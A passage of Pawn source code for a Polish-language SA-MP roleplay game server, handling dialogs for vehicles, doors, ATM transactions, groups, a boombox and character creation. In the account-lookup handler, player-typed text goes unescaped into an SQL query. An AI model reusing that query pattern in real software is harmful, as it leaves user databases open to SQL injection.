							return SetVehicleParamsEx(vehicleId, PlayerCache[playerid][pCurrentVehicle][vEngine], PlayerCache[playerid][pCurrentVehicle][vLights],  PlayerCache[playerid][pCurrentVehicle][vAlarm],  PlayerCache[playerid][pCurrentVehicle][vDoors],  PlayerCache[playerid][pCurrentVehicle][vBonnet]=0,  PlayerCache[playerid][pCurrentVehicle][vBoot],  PlayerCache[playerid][pCurrentVehicle][vObjective]);
						return SetVehicleParamsEx(vehicleId, PlayerCache[playerid][pCurrentVehicle][vEngine], PlayerCache[playerid][pCurrentVehicle][vLights],  PlayerCache[playerid][pCurrentVehicle][vAlarm],  PlayerCache[playerid][pCurrentVehicle][vDoors],  PlayerCache[playerid][pCurrentVehicle][vBonnet]=1,  PlayerCache[playerid][pCurrentVehicle][vBoot],  PlayerCache[playerid][pCurrentVehicle][vObjective]);
					}
					case 2:
					{
						if( PlayerCache[playerid][pCurrentVehicle][vBoot])
						return SetVehicleParamsEx(vehicleId,  PlayerCache[playerid][pCurrentVehicle][vEngine],  PlayerCache[playerid][pCurrentVehicle][vLights],  PlayerCache[playerid][pCurrentVehicle][vAlarm],  PlayerCache[playerid][pCurrentVehicle][vDoors],  PlayerCache[playerid][pCurrentVehicle][vBonnet],  PlayerCache[playerid][pCurrentVehicle][vBoot]=0,  PlayerCache[playerid][pCurrentVehicle][vObjective]);
						return SetVehicleParamsEx(vehicleId,  PlayerCache[playerid][pCurrentVehicle][vEngine],  PlayerCache[playerid][pCurrentVehicle][vLights],  PlayerCache[playerid][pCurrentVehicle][vAlarm],  PlayerCache[playerid][pCurrentVehicle][vDoors],  PlayerCache[playerid][pCurrentVehicle][vBonnet],  PlayerCache[playerid][pCurrentVehicle][vBoot]=1,  PlayerCache[playerid][pCurrentVehicle][vObjective]);
					}
					case 3:
					{
						PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
						new driver, passenger, bl, br;
						GetVehicleParamsCarWindows(vehicleId, driver, passenger, bl, br);
						if(!driver)
						return SetVehicleParamsCarWindows(vehicleId, 1, 1, 1, 1);
						return SetVehicleParamsCarWindows(vehicleId, 0, 0, 0, 0);
					}
					case 4:
					{
						return ShowDialogVehicleGroup(playerid);
					}
					case 5:
					{
						if( PlayerCache[playerid][pCurrentVehicle][vGroupUID] != 0)
						return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz handlowaæ pojazdem nale¿¹cym do czyjejœ grupy.");
						pVal[playerid] = PlayerCache[playerid][pCurrentVehicle][vGroupUID];
						return ShowDialogNearPlayers(playerid);
					}
				}
			}
			return 1;
		}
		case D_ADMIN_DOOR:
		{
			if(response)
			{
				new option = strval(inputtext);
				new dooruid = pVal[playerid];
				/*switch(option)
				{
					case 1:
					{
						for(new i; i<MAX_OBJECTS; i++)
						{
							if(DoorCache[dooruid][dInsVW] == 0 || DoorCache[dooruid][dOutVW] == 0)
							continue;
							if(ObjectCache[i][oState] == 0)
							{
								if(ObjectCache[i][oVW] == DoorCache[dooruid][dInsVW])
								{
									ObjectCache[i][oState]=1;
									DestroyDynamicObject(ObjectCache[i][oID]);
									if(ObjectCache[i][oPlayer] != -1)
									{
										ObjectCache[i][oPlayer] = -1;
										new editorid = ObjectCache[i][oPlayer];
										ClearAnimations(editorid);
										TextDrawForPlayerEx(editorid, 1, "Anulowano edycjê obiektu.", 3000);
									}
								}
							}
						}
						for(new i; i<=GetPlayerPoolSize(); i++)
						{
							if(DoorCache[dooruid][dInsVW] == 0 || DoorCache[dooruid][dOutVW] == 0)
							continue;
							if(IsPlayerConnected(i))
							{
								if(PlayerCache[i][pUID])
								{
									if(GetPlayerVirtualWorld(i == DoorCache[dooruid][dInsVW]))
									{
										SetPlayerPos(i, DoorCache[dooruid][dOutX], DoorCache[dooruid][dOutY], DoorCache[dooruid][dOutZ]);
										SetPlayerVirtualWorld(i, DoorCache[dooruid][dOutVW]);
										TextDrawForPlayerEx(i, 1, "Drzwi zostaly usuniete.~n~Przywrocono do pozycji wyjsciowej.", 5000);
									}
								}
							}
						}
						DestroyDynamicPickup(dPickupID[dooruid]);
						DoorCache[dooruid][dDestroyed]=1;

						new query[128];
						format(query, sizeof(query), "UPDATE players SET HouseSpawn = '0' WHERE HouseSpawn = '%d'", dooruid);
						mysql_query(DB_HANDLE, query);
					}
					case 2:
					{
						return ShowPlayerDialog(playerid, D_DOOR_VW, DIALOG_STYLE_INPUT, "Zmieñ Virtual World drzwi", "Wpisz poni¿ej wartoœæ:\n", "Zmieñ", "Anuluj");
					}
					case 3: return ShowPlayerDialog(playerid, D_ADOOR_CHANGE_NAME, DIALOG_STYLE_INPUT, ""HEX_RED"Zmieñ nazwê drzwi", ""HEX_WHITE"Wpisz poni¿ej now¹ nazwê:\n", "Zmieñ", "Anuluj");
				}*/
			}
			return 1;
		}
		case D_ADOOR_CHANGE_NAME:
		{
			if(response)
			{
				if(Isnull(inputtext))
				return ShowPlayerDialog(playerid, D_ADOOR_CHANGE_NAME, DIALOG_STYLE_INPUT, ""HEX_RED"Zmieñ nazwê drzwi", ""HEX_RED"Nazwa jest zbyt krótka!\n"HEX_WHITE"Wpisz poni¿ej now¹ nazwê:\n", "Zmieñ", "Anuluj");
				new duid = pVal[playerid];
				new name[32]; format(name, sizeof(name), inputtext);
			//	DoorCache[duid][dName] = name;
				new msg[64]; format(msg, sizeof(msg), "~w~nazwa zmieniona:~n~%s", name);
				return GameTextForPlayer(playerid, msg, 3000, 4);
			}
		}
		case D_DOOR_VW:
		{
			if(response)
			{
				if(Isnull(inputtext))
				return SendClientMessage(playerid, COLOR_GRAY, "Niepoprawna wartoœæ.");
				new vw = strval(inputtext);
				new duid =  pVal[playerid];
				//DoorCache[duid][dInsVW] = vw;
				if(vw == 0)
				{
					//dPickupID[DoorCache[duid][dUID]] = CreateDynamicPickup(1239, 2, DoorCache[duid][dInsX],DoorCache[duid][dInsY], DoorCache[duid][dInsZ], DoorCache[duid][dInsVW], 0, -1);
				}
				new msg[128]; format(msg, sizeof(msg), "Wyjœciowy Virtual World tych drzwi zosta³ poprawnie zmieniony na: %d", vw);
				return SendClientMessage(playerid, COLOR_GRAY, msg);

			}
		}
		case D_DEPOSIT:
		{
			if(response)
			{
				if(Isnull(inputtext))
				return ShowPlayerDialog(playerid, D_DEPOSIT, DIALOG_STYLE_INPUT, "Wp³aæ kwotê", ""HEX_RED"B³¹d: Nieprawid³owa wartoœæ."HEX_WHITE"\nWpisz poni¿ej kwotê jak¹ chcesz wp³aciæ do banku:", "Wp³aæ", "Wróæ");
				if(strval(inputtext) < 1 || strval(inputtext) > 5000)
				return ShowPlayerDialog(playerid, D_DEPOSIT, DIALOG_STYLE_INPUT, "Wp³aæ kwotê", ""HEX_RED"Za jednym razem mo¿esz wy³aciæ tylko 5000$ oraz minimalne wp³aciæ 1$."HEX_WHITE"\nWpisz poni¿ej kwotê jak¹ chcesz wy³aciæ do banku:", "Wp³aæ", "Wróæ");
				new val = strval(inputtext);
				if(PlayerCache[playerid][pCash] < val)
				return ShowPlayerDialog(playerid, D_DEPOSIT, DIALOG_STYLE_INPUT, "Wp³aæ kwotê", ""HEX_RED"Nie posiadasz tylu pieniêdzy przy sobie.\n"HEX_WHITE"Wpisz poni¿ej kwotê jak¹ chcesz wp³aciæ do banku", "Wp³aæ", "Wróæ");
				PlayerCache[playerid][pCash] -= val;
				GivePlayerMoney(playerid, -val);
				PlayerCache[playerid][pBank] += val;
				ApplyAnimation(playerid, "DEALER", "shop_pay", 4.1, 0, 0, 0, 0, 0, 0);
				return SendPlayerMe(playerid, "wp³aca pieni¹dze do bankomatu");
			}
			return ShowDialogATM(playerid);
		}
		case D_WITHDRAW:
		{
			if(response)
			{
				if(Isnull(inputtext))
				return ShowPlayerDialog(playerid, D_WITHDRAW, DIALOG_STYLE_INPUT, "Wyp³aæ kwotê", ""HEX_RED"B³¹d: Nieprawid³owa wartoœæ."HEX_WHITE"\nWpisz poni¿ej kwotê jak¹ chcesz wyp³aciæ z banku:", "Wyp³aæ", "Anuluj");
				if(strval(inputtext) < 1 || strval(inputtext) > 5000)
				return ShowPlayerDialog(playerid, D_WITHDRAW, DIALOG_STYLE_INPUT, "Wyp³aæ kwotê", ""HEX_RED"Za jednym razem mo¿esz wyp³aciæ tylko 5000$ oraz minimalne wyp³aciæ 1$."HEX_WHITE"\nWpisz poni¿ej kwotê jak¹ chcesz wyp³aciæ z banku:", "Wyp³aæ", "Anuluj");
				new val = strval(inputtext);
				if(PlayerCache[playerid][pBank] < val)
				return ShowPlayerDialog(playerid, D_WITHDRAW, DIALOG_STYLE_INPUT, "Wyp³aæ kwotê", ""HEX_RED"Nie posiadasz tylu pieniêdzy w banku.\n"HEX_WHITE"Wpisz poni¿ej kwotê jak¹ chcesz wyp³aciæ z banku:", "Wyp³aæ", "Anuluj");
				PlayerCache[playerid][pCash] += val;
				GivePlayerMoney(playerid, val);
				PlayerCache[playerid][pBank] -= val;
				ApplyAnimation(playerid, "DEALER", "shop_pay", 4.1, 0, 0, 0, 0, 0, 0);
				return SendPlayerMe(playerid, "wyp³aca pieni¹dze z bankomatu");
			}
			return ShowDialogATM(playerid);
		}
		case D_ATM:
		{
			if(response)
			{
				new option = strval(inputtext);
				switch(option)
				{
					case 1: ShowPlayerDialog(playerid, D_WITHDRAW, DIALOG_STYLE_INPUT, "Wyp³aæ kwotê", ""HEX_WHITE"Wpisz poni¿ej kwotê jak¹ chcesz wyp³aciæ z banku:", "Wyp³aæ", "Anuluj");
					case 2: ShowPlayerDialog(playerid, D_DEPOSIT, DIALOG_STYLE_INPUT, "Wp³aæ kwotê", ""HEX_WHITE"Wpisz poni¿ej kwotê jak¹ chcesz wp³aciæ do banku:", "Wp³aæ", "Anuluj");
				}
			}
		}
		case D_VEHICLES:
		{
			if(response)
			{

				new vuid = 0;
				sscanf(inputtext, "i", vuid);

				new query[128];
				format(query, sizeof(query), "SELECT gameId FROM vehicles WHERE UID=%d LIMIT 1;", vuid);
				new Cache:cache = mysql_query(DB_HANDLE, query);
				new vehicleId = 0;
				cache_get_value_name_int(0, "gameId", vehicleId);
				cache_delete(cache);

				DestroyDynamicMapIcon(MapIcon[playerid]);
				KillTimer(MapIconTimer[playerid]);

				if(vehicleId){
					for(new i=0; i<=GetVehiclePoolSize();i++){
						if(IsValidVehicle(i)){
							if(i == vehicleId){

								if(AreAnyPlayersInVehicle(i))
									return SendClientMessage(playerid, COLOR_GRAY, "Ktoœ znajduje siê w tym pojeŸdzie zatem nie mo¿esz go odspawnowaæ.");
								TextDrawForPlayerEx(playerid, 1, "Odspawnowano pojazd.", 3000);
	
								UnSpawnVehicle(i);

							}
						}
					}
				}
				else
				{	
					vehicleId=SpawnVehicle(vuid);
					TextDrawForPlayerEx(playerid, 1, "Zespawnowano pojazd.~n~Miejsce pojazdu zostalo oznaczone na mapie.", 5000);

					new Float:posX, Float:posY, Float:posZ;
					GetVehiclePos(vehicleId, posX, posY, posZ);
					new vw = GetVehicleVirtualWorld(vehicleId);

					MapIcon[playerid] = CreateDynamicMapIcon( posX, posY, posZ, 55,-1, vw, 0, playerid,-1, 3);
					MapIconTimer[playerid] = SetTimerEx("DestroyIcon", 5000*60, false, "i", playerid);
				}

			

			
				/*if( PlayerCache[playerid][pCurrentVehicle][vState] == 2)
				{
					new info[64]; format(info, sizeof(info), "%s~n~%s~n~~r~[%s]", ReturnPlayerName(playerid), GetVehicleName( PlayerCache[playerid][pCurrentVehicle][vModel]), GroupCache[ PlayerCache[playerid][pCurrentVehicle][vOwner]][gName]);
					new guid =  PlayerCache[playerid][pCurrentVehicle][vOwner];
					for(new i=0; i<=GetPlayerPoolSize(); i++)
					{
						if(IsPlayerConnected(i))
						{
							if(PlayerCache[i][pGroup] == guid || PlayerCache[i][pGroup2] == guid || PlayerCache[i][pGroup3] == guid)
							{
								GameTextForPlayer(i, info, 3000, 4);
							}
						}
					}
				}*/
				
			}
			else
			{
				return 1;
			}
		}
		case D_CHANGE_GROUP_COLOR:
		{
			if(response)
			{
				if(strlen(inputtext) != 6)
				return ShowDialogChangeGroupColor(playerid);
				new guid=pVal[playerid], gcolor[16];
				format(gcolor, sizeof(gcolor), "%s", inputtext);
				GroupCache[guid][gColor] = gcolor;
				for(new i; i<=GetPlayerPoolSize(); i++)
				{
					if(IsPlayerConnected(i))
					{
						if(pDuty[i] == guid)
						{
							UpdatePlayerName(i);
						}
					}
				}
				new msg[64]; format(msg, sizeof(msg), "{%s}Kolor grupy zosta³ zmieniony pomyœlnie!", GroupCache[guid][gColor]);
				SendClientMessage(playerid, -1, msg);
			}
			return ShowDialogGroupPanel(playerid);
		}
		case D_JOIN_GROUP:
		{
			/*new senderuid = pVal[playerid];
			new senderid;
			for(new i; i<=GetPlayerPoolSize(); i++)
			{
				if(IsPlayerConnected(i))
				{
					if(PlayerCache[i][pUID] == senderuid)
					{
						senderid = i;
					}
				}
			}
			if(!IsPlayerConnected(senderid))
			return SendClientMessage(playerid, COLOR_GRAY, "Gracz wylogowa³ siê lub wyszed³ z gry.");
			new groupuid = pVal2[playerid];
			if(response)
			{
				if(PlayerCache[playerid][pGroup] == 0)
				PlayerCache[playerid][pGroup] = groupuid;
				else if(PlayerCache[playerid][pGroup2] == 0)
				PlayerCache[playerid][pGroup2] = groupuid;
				else if(PlayerCache[playerid][pGroup3] == 0)
				PlayerCache[playerid][pGroup3] = groupuid;
				else return SendClientMessage(playerid, COLOR_GRAY, "Osi¹gniêto limit grup pod /g. Jeœli chcesz do³¹czyæ do grupy musisz opuœciæ jedn¹ ze swoich grup (/g [slot] opusc).");

				TextDrawForPlayerEx(senderid, 1, "Oferta ~g~~h~zaakceptowana.", 3000);
				TextDrawForPlayerEx(playerid, 1, "Oferta ~g~~h~zaakceptowana.", 3000);
				return ShowDialogInfo(playerid, "Do³¹czono do grupy.\nGrupê mo¿esz zobaczyæ pod komend¹ /g.");
			}
			else
			{
				TextDrawForPlayerEx(senderid, 1, "Oferta ~r~anulowana.", 3000);
				return TextDrawForPlayerEx(playerid, 1, "Oferta ~r~anulowana.", 3000);
			}*/
		}
		case D_GROUP_MEMBERS:
		{
			if(response)
			{
				/*new guid = pVal[playerid];
				new uid = strval(inputtext);
				if(uid)
				{
					if(PlayerCache[playerid][pGroup] == guid)
					{
						if(!PlayerCache[playerid][pGroupAdmin])
						{
							return ShowDialogInfo(playerid, "Lider grupy nie nada³ Ci uprawnieñ do zmiany opcji cz³onków.");
						}
					}
					else if(PlayerCache[playerid][pGroup2] == guid)
					{
						if(!PlayerCache[playerid][pGroupAdmin2])
						{
							return ShowDialogInfo(playerid, "Lider grupy nie nada³ Ci uprawnieñ do zmiany opcji cz³onków.");
						}
					}
					else if(PlayerCache[playerid][pGroup3] == guid)
					{
						if(!PlayerCache[playerid][pGroupAdmin3])
						{
							return ShowDialogInfo(playerid, "Lider grupy nie nada³ Ci uprawnieñ do zmiany opcji cz³onków.");
						}
					}
					pVal2[playerid] = uid;
					return ShowDialogManageMember(playerid);
				}
				if(!strcmp(inputtext, "Dalej", false))
				{
					
				}
				if(!strcmp(inputtext, "Wstecz", false))
				{
					if(pPage[playerid] - 1 > -1)
					pPage[playerid]--;
					else
					return ShowDialogGroupPanel(playerid);
				}
				new info[128];
				new list[725] = "#\tCz³onek\tUprawnienia\n";
				new count;
				for(new i=pPage[playerid]; i<LastUID; i++)
				{
					if(i == 0)
					continue;
					if(PlayerCache[i][pGroup] == guid || PlayerCache[i][pGroup2] == guid || PlayerCache[i][pGroup3] == guid)
					{
						format(info, sizeof(info), "%d\t%s\t%s\n", i, PlayerCache[i][pName], GetUserPerms(i, guid));
						strins(list, info, strlen(list));
						count++;
						if(count == 10)
						{
							if(!strcmp(inputtext, "Dalej", false))
							{
								pPage[playerid] = i+1;
							}
							break;
						}
					}
				}
				if(count)
				{
					for(new i=pPage[playerid]; i<LastUID; i++)
					{
						if(PlayerCache[i][pGroup] == guid || PlayerCache[i][pGroup2] == guid || PlayerCache[i][pGroup3] == guid)
						{
							strins(list, " \nDalej\nWstecz", strlen(list));
							return ShowPlayerDialog(playerid, D_GROUP_MEMBERS, DIALOG_STYLE_TABLIST_HEADERS, "Cz³onkowie (wybierz aby edytowaæ)", list, "Wybierz", "Anuluj");
						}
					}
					strins(list, " \nWstecz", strlen(list));
					return ShowPlayerDialog(playerid, D_GROUP_MEMBERS, DIALOG_STYLE_TABLIST_HEADERS, "Cz³onkowie (wybierz aby edytowaæ)", list, "Wybierz", "Anuluj");
				}
				pPage[playerid] = 0;*/
				return ShowDialogInfo(playerid, "To ju¿ wszystko.");
			}
			else
			{
				pPage[playerid] = 0;
			}
		}
		case D_GROUP_PANEL:
		{
			if(response)
			{
				/*new option = strval(inputtext);
				new guid = pVal[playerid];
				switch(option)
				{
					case 1:
					{
						return ShowDialogGroupMembers(playerid);
					}
					case 2:
					{
						if(PlayerCache[playerid][pGroup] == guid)
						{
							if(!PlayerCache[playerid][pGroupAdmin])
							return ShowDialogInfo(playerid, "Lider tej grupy nie nada³ Ci odpowiednich\nuprawnieñ do zarz¹dzania ni¹.");
						}
						else if(PlayerCache[playerid][pGroup2] == guid)
						{
							if(!PlayerCache[playerid][pGroupAdmin2])
							return ShowDialogInfo(playerid, "Lider tej grupy nie nada³ Ci odpowiednich\nuprawnieñ do zarz¹dzania ni¹.");
						}
						else if(PlayerCache[playerid][pGroup3] == guid)
						{
							if(!PlayerCache[playerid][pGroupAdmin3])
							return ShowDialogInfo(playerid, "Lider tej grupy nie nada³ Ci odpowiednich\nuprawnieñ do zarz¹dzania ni¹.");
						}
						return ShowDialogGroupOptions(playerid, guid);
					}
				}*/
			}
			return 1;
		}
		case D_DOOR_COST:
		{
			if(response)
			{
				new str[128];
				format(str, sizeof(str), " %s", inputtext);
				new cost;
				if(sscanf(str, "i", cost))
				return ShowDialogDoorCost(playerid);
				if(cost < 0 || cost > 1000)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Zakres op³aty za przejœcie mieœci siê pomiêdzy 0 -1000$");
					return ShowDialogDoorCost(playerid);
				}
			//	DoorCache[GetPlayerDoorUID(playerid)][dEnterCost] = cost;
			}
			return ShowDialogGroupPanel(playerid);
		}
		case D_DOOR_GROUP:
		{
			/*if(response)
			{
				if(Isnull(inputtext))
				return ShowDialogDoorGroup(playerid);
				new text[128]; format(text, sizeof(text), " %s", inputtext);
				new slot;
				new uid = GetPlayerDoorUID(playerid);
				if(sscanf(text, "i", slot) || slot > 3 || slot < 1)
				return SendClientMessage(playerid, COLOR_GRAY, "Nieprawid³owy slot grupy.");
				switch(slot)
				{
					case 1:
					{
						if(PlayerCache[playerid][pGroup] == 0)
						return SendClientMessage(playerid, COLOR_GRAY, "Pod tym slotem nie znajduje siê ¿adna grupa.");
//						DoorCache[uid][dGroupUID] = PlayerCache[playerid][pGroup];
					}
					case 2:
					{
						if(PlayerCache[playerid][pGroup2] == 0)
						return SendClientMessage(playerid, COLOR_GRAY, "Pod tym slotem nie znajduje siê ¿adna grupa.");
					//	DoorCache[uid][dGroupUID] = PlayerCache[playerid][pGroup2];
					}
					case 3:
					{
						if(PlayerCache[playerid][pGroup3] == 0)
						return SendClientMessage(playerid, COLOR_GRAY, "Pod tym slotem nie znajduje siê ¿adna grupa.");
					//	DoorCache[uid][dGroupUID] = PlayerCache[playerid][pGroup3];
					}
				}
				DestroyDynamicPickup(dPickupID[uid]);
				dPickupID[uid] = CreateDynamicPickup(GetPickupModelFromGroupType(GroupCache[DoorCache[uid][dGroupUID]][gType]), 2, DoorCache[uid][dOutX],DoorCache[uid][dOutY], DoorCache[uid][dOutZ], DoorCache[uid][dOutVW], 0, -1);
				format(text, sizeof(text), "> Drzwi zosta³y pomyœlnie podpisane pod grupê %s (UID: %d). U¿yj /drzwi [opcje] by ustawiæ op³atê za przejœcie!", GroupCache[DoorCache[uid][dGroupUID]][gName], DoorCache[uid][dGroupUID]);
				if(GetMapIcon(GroupCache[DoorCache[uid][dGroupUID]][gType]))
				CreateDynamicMapIcon(DoorCache[uid][dOutX],DoorCache[uid][dOutY], DoorCache[uid][dOutZ], GetMapIcon(GroupCache[DoorCache[uid][dGroupUID]][gType]), -1, 0, -1, -1, STREAMER_MAP_ICON_SD, MAPICON_LOCAL);
				return SendClientMessage(playerid, COLOR_WHITE, text);
			}*/
			return 1;
		}
		/*case D_COMMANDS:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0: return ShowPlayerDialog(playerid, D_CMDS_OBJECT, DIALOG_STYLE_MSGBOX, "Pomoc > Przydatne komendy > Obiekty", ""HEX_WHITE"/mc "HEX_BLUE"[id obiektu]"HEX_WHITE" by utworzyæ obiekt.\n/msel "HEX_BLUE"[opcjonalna wartoœæ]"HEX_WHITE" by edytowaæ obiekt w pobli¿u.\n\
					"HEX_RED"/md"HEX_WHITE" by usun¹æ aktualnie edytowany obiekt.\n/mmat by na³o¿yæ texturê na aktualnie edytowany obiekt\n\nRotacja obiektu:\n/rx [wartoœæ]\n/ry [wartoœæ]\n/rz [wartoœæ]", "Ok", "");
				}
			}
		}*/
		case D_HELP:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0:	return ShowDialogCommands(playerid);
					case 1: return ShowDialogStats(playerid);
					case 2: return ShowDialogAnim(playerid);
				}
			}
			return 1;
		}
		case D_CHANGE_DOOR_NAME:
		{
			if(response)
			{
				if(Isnull(inputtext))
				return ShowDialogChangeDoorName(playerid);
				if(PlayerCache[playerid][pCash] < 2000)
				return ShowPlayerDialog(playerid, D_CHANGE_DOOR_NAME, DIALOG_STYLE_INPUT, "Zmieñ nazwê drzwi", ""HEX_RED"Nie posiadasz 2000$ na zmianê nazwy drzwi!\n"HEX_WHITE"Wpisz poni¿ej now¹ nazwê drzwi:", "ZatwierdŸ", "Anuluj");
				if(strlen(inputtext) > 32)
				return ShowPlayerDialog(playerid, D_CHANGE_DOOR_NAME, DIALOG_STYLE_INPUT, "Zmieñ nazwê drzwi", ""HEX_RED"Wybrana nazwa jest zbyt d³uga!\n"HEX_WHITE"Wpisz poni¿ej now¹ nazwê drzwi:", "ZatwierdŸ", "Anuluj");
				PlayerCache[playerid][pCash] -= 2000;
				GivePlayerMoney(playerid, -2000);
				new name[32]; format(name, sizeof(name), inputtext);
				new dooruid = pVal[playerid];
				//DoorCache[dooruid][dName] = name;
				return SendClientMessage(playerid, COLOR_GRAY, "Nazwa drzwi zosta³a zmieniona pomyœlnie.");
			}
			return 1;
		}
		case D_CHANGE_URL:
		{
			if(response)
			{
				if(Isnull(inputtext))
				return ShowDialogChangeUrl(playerid);
				new pvw = GetPlayerVirtualWorld(playerid);
				for(new i; i<=GetPlayerPoolSize(); i++)
				{
					if(IsPlayerConnected(i))
					{
						if(GetPlayerVirtualWorld(i) == pvw)
						{
							PlayAudioStreamForPlayer(i, inputtext);
						}
					}
				}
				new url[256]; format(url, sizeof(url), inputtext);
				//DoorCache[GetPlayerDoorUID(playerid)][dUrl] = url;
				new msg[128];
				format(msg, sizeof(msg), "* %s zmienia p³ytê w systemie nag³aœniaj¹cym audio.", strreplace(ReturnPlayerName(playerid), '_', ' '));
				SendPlayerMe(playerid, msg);
			}
			return 1;
		}
		case D_BOOMBOX:
		{
			if(response)
			{
				if(Isnull(inputtext))
				return ShowDialogBoomBox(playerid);
				new uid = pVal[playerid];
				new Float:X, Float:Y, Float:Z; GetPlayerPos(playerid, X, Y, Z);
				ItemCache[uid][iVal] =  CreateDynamicObject(2226, X, Y, Z-1.0, 0.0, 0.0, 0.0, GetPlayerVirtualWorld(playerid), -1, -1);
				ApplyAnimation(playerid, "bomber", "bom_plant", 4.1, 0, 0, 0, 0, 0, 0);
				new str[128]; format(str, sizeof(str), "k³adzie %s na ziemie oraz wybiera stacjê radiow¹.", ItemCache[uid][iName]);
				SendPlayerMe(playerid, str);
				new vw = GetPlayerVirtualWorld(playerid);
				for(new i; i<=GetPlayerPoolSize(); i++)
				{
					if(IsPlayerConnected(i))
					{
						if(IsPlayerInRangeOfPoint(i, 30.0, X, Y, Z))
						{
							if(GetPlayerVirtualWorld(i) == vw)
							{
								StopAudioStreamForPlayer(i);
								PlayAudioStreamForPlayer(i, inputtext, X, Y, Z, 50.0, 1);
							}
						}
					}
				}
				ItemCache[uid][iActive]=1;
			}
			return 1;
		}
		case D_DOOR_SETTINGS:
		{
			if(response)
			{
				new option=strval(inputtext);
				new uid = pVal[playerid];
				switch(option)
				{
					case 1:
					{
						//GetPlayerPos(playerid, DoorCache[uid][dInsX], DoorCache[uid][dInsY], DoorCache[uid][dInsZ]);
						//GetPlayerFacingAngle(playerid, DoorCache[uid][dFacingAngle]);
						TextDrawForPlayerEx(playerid, 1, "Pozycja wejsciowa zostala zmieniona pomyslnie.", 3000);
					}
					case 2: 
					{
					//	if(DoorCache[uid][dType])
					//	return ShowDialogInfo(playerid, "Nie mo¿esz wybraæ spawnu w tym budynku.");
						if(PlayerCache[playerid][pHouseSpawn] == uid)
						{
							PlayerCache[playerid][pHouseSpawn] = 0;
							return SendClientMessage(playerid, COLOR_GRAY, "Wymeldowano.");
						}
						PlayerCache[playerid][pHouseSpawn] = uid;
						return SendClientMessage(playerid, COLOR_GRAY, "Od teraz bêdzie siê tu spawnowa³.");
					}
					case 3:
					{
					/*	if(!Isnull(DoorCache[uid][dUrl]))
						{
							return ShowDialogChangeUrl(playerid);
						}
						else
						{
							if(PlayerCache[playerid][pCash] < 1200)
							return SendClientMessage(playerid, COLOR_GRAY, "Nie posiadasz przy sobie 1200$ na ten zakup.");
						}
						new str[256]; str = " ";
						DoorCache[uid][dUrl] = str;
						PlayerCache[playerid][pCash] -= 1200;
						GivePlayerMoney(playerid, -1200);
						SendClientMessage(playerid, COLOR_GRAY, "Zakupiono system nag³aœniaj¹cy!");*/
					}
					case 4:
					{
					//	SetPlayerPos(playerid, DoorCache[uid][dInsX], DoorCache[uid][dInsY], DoorCache[uid][dInsZ]);
						return TextDrawForPlayerEx(playerid, 1, "Przeteleportowano do pozycji wyjsciowej.", 3000);
					}
					case 5:
					{
						if(PlayerCache[playerid][pCash] < 2000)
						return SendClientMessage(playerid, COLOR_GRAY, "Nie posiadasz przy sobie 2000$ do zmiany nazwy drzwi.");
						return ShowDialogChangeDoorName(playerid);
					}
					case 6:
					{
						/*if(DoorCache[uid][dGroupUID] != 0)
						return ShowDialogInfo(playerid, ""HEX_WHITE"Ten budynek jest ju¿ podpisany pod jakiœ biznes");
						if(DoorCache[uid][dType])
						return ShowDialogDoorGroup(playerid);
						return ShowDialogInfo(playerid, ""HEX_WHITE"Nie mo¿esz podpisaæ tego budynku pod grupê.");*/
					}
					case 7:
					{
					/*	if(DoorCache[uid][dType])
						{
							if(DoorCache[uid][dGroupUID] == 0)
							return ShowDialogInfo(playerid, ""HEX_WHITE"Ten budynek nie jest podpisany pod ¿aden biznes.");
							return ShowDialogDoorCost(playerid);
						}*/
						return ShowDialogInfo(playerid, ""HEX_WHITE"Ten budynek jest domem - nie mo¿esz ustawiæ op³aty za przejœcie.");
					}
					case 8:
					{
					/*	if(DoorCache[uid][dVehicle])
						{
							DoorCache[uid][dVehicle]=0;
							TextDrawForPlayerEx(playerid, 1, "Przejazd pojazdami zostal ~r~~h~~h~wylaczony~w~.", 3000);
						}
						else
						{
							DoorCache[uid][dVehicle]=1;
							TextDrawForPlayerEx(playerid, 1, "Przejazd pojazdami zostal ~g~~h~~h~wlaczony~w~.", 3000);
						}*/
						return ShowDialogDoorSettings(playerid);
					}
					case 9:
					{
					/*	if(!DoorCache[uid][dAlarm])
						{
							if(PlayerCache[playerid][pCash] < 2500)
							return ShowDialogInfo(playerid, "Nie posiadasz przy sobie $2500 na kupno alarmu.");
							PlayerCache[playerid][pCash] -= 2500;
							GivePlayerMoney(playerid, -2500);
							DoorCache[uid][dAlarm] = true;
							return ShowDialogInfo(playerid, ""HEX_WHITE"Alarm zosta³ zakupiony!\nOdpowiednie s³u¿by zostan¹ poinformowane podczas próby w³amania do budynku.\nW³amanie zostanie wykryte równie¿ przy strzelaniu w budynku z "HEX_DARKRED"g³oœnej "HEX_WHITE"broni palnej.");
						}*/
						return ShowDialogInfo(playerid, "W tym budynku zamontowano alarm.");
					}
				}
			}
		}
		case D_FIND:
		{
			if(response)
			{
				if(strlen(inputtext) > 24 || strlen(inputtext) < 3)
				{
					return ShowDialogFind(playerid);
				}
				new query[256];
				format(query, sizeof(query), "SELECT * FROM players WHERE name = '%s'", inputtext);
				new Cache:cache = mysql_query(DB_HANDLE, query);

				if(cache_num_rows()){
					SetPlayerName(playerid, inputtext);
					LoadPlayerData(playerid);
					ShowDialogLogin(playerid);
				}else{
						ShowDialogNotFound(playerid);
				}
				cache_delete(cache);

	

				return 1;
			}
			else
			{
				return ShowDialogCreate(playerid);
			}
		}
		case D_NOTFOUND:
		{
			if(response)
			{
				return ShowDialogCreate(playerid);
			}
			else
			{
				return ShowDialogFind(playerid);
			}
		}
		case D_CREATE:
		{
			if(response)
			{
				if(Isnull(inputtext))
				return ShowDialogCreate(playerid);

				new pname[MAX_PLAYER_NAME], pborndate, sex[2];
				new text[128];
				format(text, sizeof(text), " %s", inputtext);

				if(sscanf(text, "s[24]is[2]", pname, pborndate, sex))
				return ShowDialogCreate(playerid);

				if(strlen(pname) > 24 || strlen(pname) < 6)
				{	
					SendClientMessage(playerid, COLOR_WHITE, "> Wybrana nazwa jest "HEX_RED"zbyt d³uga"HEX_WHITE" lub "HEX_RED"zbyt krótka"HEX_WHITE".");
					ShowDialogCreate(playerid);
					return 1;
				}
				if(pborndate < 1910 || pborndate > 2005)
				{
					SendClientMessage(playerid, COLOR_WHITE, "> Data narodzin Twojej postaci musi mieœciæ siê w zakresie 1910 - 2005.");
					return ShowDialogCreate(playerid);
				}
